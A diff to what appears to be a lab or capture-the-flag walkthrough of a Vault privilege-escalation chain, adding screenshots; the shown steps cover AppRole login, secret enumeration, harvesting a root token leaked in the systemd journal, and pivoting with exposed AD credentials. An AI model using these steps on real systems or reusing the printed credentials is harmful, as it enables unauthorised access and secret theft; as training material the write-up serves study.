@@ -24,6 +24,9 @@ curl -s -X POST ${VAULT_ADDR}/v1/auth/approle/login \
 ```
 Extract `client_token` → `VAULT_TOKEN`.
 
+<img width="1607" height="268" alt="image" src="https://github.com/user-attachments/assets/1ec51e03-5735-4e1d-8861-6b719cc5bc55" />
+
+
 ### Step 2 — Enumerate Accessible Secrets
 ```bash
 export VAULT_TOKEN="<appRole_token>"
@@ -35,6 +38,15 @@ vault kv get secret/pul/creds/vault-ssh
 ```
 Note: `secret/pul/ad` is listed but read will be denied with AppRole policy.
 
+<img width="1203" height="860" alt="image" src="https://github.com/user-attachments/assets/7cab2a0d-7b56-4200-af65-c3ddd9707f6d" />
+
+<img width="862" height="912" alt="image" src="https://github.com/user-attachments/assets/2c7a1f82-060f-4bbc-a32c-01f0378be85f" />
+
+<img width="1017" height="974" alt="image" src="https://github.com/user-attachments/assets/084f3415-728d-4bd7-b535-6bff449de687" />
+
+<img width="1054" height="586" alt="image" src="https://github.com/user-attachments/assets/6e9fc5d7-7170-4c10-86bb-c7cee8aa7f08" />
+
+
 ### Step 3 — Escalate via Root Token Leaked in Journal
 The Vault service runs with `-dev-root-token-id` flag — this appears in the systemd journal:
 ```bash
@@ -43,6 +55,9 @@ journalctl -u pul-vault --no-pager | grep -i "root.token\|dev.root\|token.id"
 # Output includes:
 # ==> Vault server configuration: ... dev-root-token-id=pul-vault-root-s3cr3t-2024-gridfall
 ```
+
+<img width="1930" height="327" alt="image" src="https://github.com/user-attachments/assets/599d533a-2b8a-44a4-be30-bafc9c187677" />
+
 
 Also leaked in process environment:
 ```bash
@@ -68,9 +83,13 @@ bind_pass     M0n!tor@PUL24
 pivot_note    Prometheus metrics portal: 203.x.x.x:9090
 ```
 
+<img width="1040" height="579" alt="image" src="https://github.com/user-attachments/assets/a8981778-055c-4d75-817e-5e857cf40f22" />
+
+
 ### Step 5 — Pivot Artifacts
 - **Monitoring Portal:** `203.x.x.x:9090` → M4
 - **AD Credential (for AD zone connection):** `svc-monitor:M0n!tor@PUL24`
+
 
 ---
 
